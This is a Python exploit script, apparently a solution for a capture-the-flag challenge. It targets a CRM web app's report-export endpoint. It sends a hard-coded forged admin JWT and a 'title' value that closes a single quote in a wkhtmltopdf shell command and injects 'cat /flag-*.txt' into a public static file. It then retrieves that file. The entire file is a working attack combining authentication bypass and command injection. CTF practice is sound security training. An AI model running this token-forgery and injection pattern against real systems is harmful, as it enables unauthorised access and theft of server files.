#!/usr/bin/env python3
import argparse
import re
import sys
import time
from urllib.parse import urljoin

import requests

# Admin JWT generated from the challenge binary's own jwt.SigningMethodHS256 path.
# Payload: {sub:1,email:admin@crm.local,role:admin,is_admin:true,iat:1780000000,exp:1893456000}
# exp = 2030-01-01 00:00:00 UTC
ADMIN_JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJlbWFpbCI6ImFkbWluQGNybS5sb2NhbCIsImV4cCI6MTg5MzQ1NjAwMCwiaWF0IjoxNzgwMDAwMDAwLCJpc19hZG1pbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwic3ViIjoxfQ."
    "V8EdCxiH7UR3fUPVV4KbEbYxmUHkswmQQcqeFR8GXvM"
)


def normalize_base(target: str) -> str:
    target = target.strip().rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    return target + "/"


def main() -> int:
    ap = argparse.ArgumentParser(description="Exploit red_flag CRM")
    ap.add_argument("target", help="base URL, e.g. http://challs.nusgreyhats.org:34367")
    ap.add_argument("--token", default=ADMIN_JWT, help="override forged admin JWT")
    ap.add_argument("--out", default=None, help="output filename under /static")
    args = ap.parse_args()

    base = normalize_base(args.target)
    sess = requests.Session()
    sess.headers.update({"Authorization": f"Bearer {args.token}"})

    out = args.out or f"flag_{int(time.time())}.txt"
    # Vulnerable command template in the server:
    # wkhtmltopdf --title '%s' ...
    # Close the single quote, execute our command, then reopen the quote.
    title = f"x'; cat /flag-*.txt > /static/{out}; echo '"

    print(f"[+] target = {base}")
    print(f"[+] writing flag to /static/{out}")

    r = sess.post(
        urljoin(base, "api/reports/export"),
        json={"type": "customers", "format": "pdf", "title": title},
        timeout=10,
    )
    print(f"[+] export status = {r.status_code}")
    # The endpoint often returns 404/500 because wkhtmltopdf itself is absent/fails,
    # but the shell command before it already ran.

    flag_url = urljoin(base, f"static/{out}")
    for i in range(5):
        rr = requests.get(flag_url, timeout=10)
        if rr.status_code == 200 and rr.text.strip():
            print(f"[+] fetched {flag_url}")
            text = rr.text.strip()
            m = re.search(r"grey\{[^}\n]+\}", text)
            print(m.group(0) if m else text)
            return 0
        time.sleep(0.4)

    print("[-] failed to fetch written flag file")
    print(f"[-] last GET status={rr.status_code} body={rr.text[:200]!r}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
